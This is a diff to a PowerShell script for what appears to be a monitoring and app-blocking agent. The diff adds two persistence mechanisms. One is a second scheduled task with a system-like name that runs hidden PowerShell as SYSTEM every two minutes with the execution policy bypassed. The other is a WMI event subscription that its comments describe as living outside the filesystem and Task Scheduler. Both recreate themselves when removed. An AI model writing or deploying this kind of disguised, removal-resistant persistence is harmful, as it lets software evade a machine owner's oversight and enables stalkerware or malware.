@@ -254,6 +254,105 @@ function Ensure-WatchdogTask {
 }
 
 # ══════════════════════════════════════════════════════════════
+#  GUARD TASK: segunda scheduled task com nome/trigger diferente
+# ══════════════════════════════════════════════════════════════
+$script:GuardTaskName = "WinSysMonGuard"
+function Ensure-GuardTask {
+    param([switch]$Force)
+    if (-not $Force) {
+        $elapsed = (New-TimeSpan -Start $script:LastWatchdogCheck -End (Get-Date)).TotalSeconds
+        if ($elapsed -lt 60) { return }
+    }
+    try {
+        $taskName = $script:GuardTaskName
+        $cmd = Get-WatchdogCommand
+        $needCreate = $true
+        try {
+            $existing = Get-ScheduledTask -TaskName $taskName -ErrorAction Stop
+            if ($existing) { $needCreate = $false }
+        } catch {}
+        if ($needCreate) {
+            Write-Log "Recriando guard task: $taskName"
+            try { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
+            $action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$cmd`""
+            # Trigger diferente do watchdog: a cada 2 min + no logon
+            $trigger1  = New-ScheduledTaskTrigger -AtLogOn
+            $trigger2  = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration ([TimeSpan]::FromDays(3650))
+            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+            $settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -ExecutionTimeLimit (New-TimeSpan -Minutes 10)
+            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1,$trigger2) -Principal $principal -Settings $settings -Force | Out-Null
+            Write-Log "Guard task registrada (AtLogOn + a cada 2 min)"
+        }
+    } catch {
+        Write-Log "Ensure-GuardTask falhou: $($_.Exception.Message)" "WARN"
+    }
+}
+
+# ══════════════════════════════════════════════════════════════
+#  WMI PERSISTENCE: __EventFilter + CommandLineEventConsumer
+#  Vive no repositorio WMI (fora do filesystem e fora do Task Scheduler)
+# ══════════════════════════════════════════════════════════════
+$script:LastWmiCheck = [datetime]::MinValue
+$script:WmiFilterName   = "WinSysMonFilter"
+$script:WmiConsumerName = "WinSysMonConsumer"
+
+function Ensure-WmiPersistence {
+    param([switch]$Force)
+    if (-not $Force) {
+        $elapsed = (New-TimeSpan -Start $script:LastWmiCheck -End (Get-Date)).TotalSeconds
+        if ($elapsed -lt 120) { return }
+    }
+    $script:LastWmiCheck = Get-Date
+    try {
+        $ns       = "root\subscription"
+        $fname    = $script:WmiFilterName
+        $cname    = $script:WmiConsumerName
+        $cmd      = Get-WatchdogCommand
+        $cmdLine  = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$cmd`""
+
+        # __EventFilter: dispara a cada 60s via Win32_LocalTime
+        $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 5"
+
+        $filter = Get-CimInstance -Namespace $ns -ClassName __EventFilter -Filter "Name='$fname'" -ErrorAction SilentlyContinue
+        if (-not $filter) {
+            $filterArgs = @{
+                Name            = $fname
+                EventNameSpace  = "root\cimv2"
+                QueryLanguage   = "WQL"
+                Query           = $query
+            }
+            $filter = New-CimInstance -Namespace $ns -ClassName __EventFilter -Property $filterArgs -ErrorAction Stop
+            Write-Log "WMI __EventFilter criado: $fname"
+        }
+
+        $consumer = Get-CimInstance -Namespace $ns -ClassName CommandLineEventConsumer -Filter "Name='$cname'" -ErrorAction SilentlyContinue
+        if (-not $consumer) {
+            $consumerArgs = @{
+                Name             = $cname
+                CommandLineTemplate = $cmdLine
+                RunInteractively = $false
+            }
+            $consumer = New-CimInstance -Namespace $ns -ClassName CommandLineEventConsumer -Property $consumerArgs -ErrorAction Stop
+            Write-Log "WMI CommandLineEventConsumer criado: $cname"
+        }
+
+        # Bind filter -> consumer
+        $binding = Get-CimInstance -Namespace $ns -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue |
+                   Where-Object { $_.Filter.Name -eq $fname -and $_.Consumer.Name -eq $cname }
+        if (-not $binding) {
+            $bindArgs = @{
+                Filter   = [ref]$filter
+                Consumer = [ref]$consumer
+            }
+            New-CimInstance -Namespace $ns -ClassName __FilterToConsumerBinding -Property $bindArgs -ErrorAction Stop | Out-Null
+            Write-Log "WMI __FilterToConsumerBinding criado"
+        }
+    } catch {
+        Write-Log "Ensure-WmiPersistence falhou: $($_.Exception.Message)" "WARN"
+    }
+}
+
+# ══════════════════════════════════════════════════════════════
 #  BLOQUEIO DE APLICATIVOS
 # ══════════════════════════════════════════════════════════════
 $script:RemoteBlockCache = @()
@@ -979,6 +1078,8 @@ function Start-AgentLoop {
     try { Protect-InstallFolder -Force } catch { Write-Log "Protect-InstallFolder inicial falhou: $($_.Exception.Message)" "WARN" }
     # Garante watchdog task (self-healing externo)
     try { Ensure-WatchdogTask -Force } catch { Write-Log "Ensure-WatchdogTask inicial falhou: $($_.Exception.Message)" "WARN" }
+    try { Ensure-GuardTask -Force } catch { Write-Log "Ensure-GuardTask inicial falhou: $($_.Exception.Message)" "WARN" }
+    try { Ensure-WmiPersistence -Force } catch { Write-Log "Ensure-WmiPersistence inicial falhou: $($_.Exception.Message)" "WARN" }
 
     $cfg = Load-Config
     $script:PollInterval = $cfg.PollInterval
@@ -1078,6 +1179,8 @@ function Start-AgentLoop {
             try { Protect-InstallFolder } catch {}
             # Recria watchdog se for apagada (throttle 60s)
             try { Ensure-WatchdogTask } catch {}
+            try { Ensure-GuardTask } catch {}
+            try { Ensure-WmiPersistence } catch {}
 
             if ($cfg.MonitorLogins -and ($iteration % 6 -eq 0)) { try { Monitor-Logins } catch {} }
             if ($cfg.CollectHardware) {
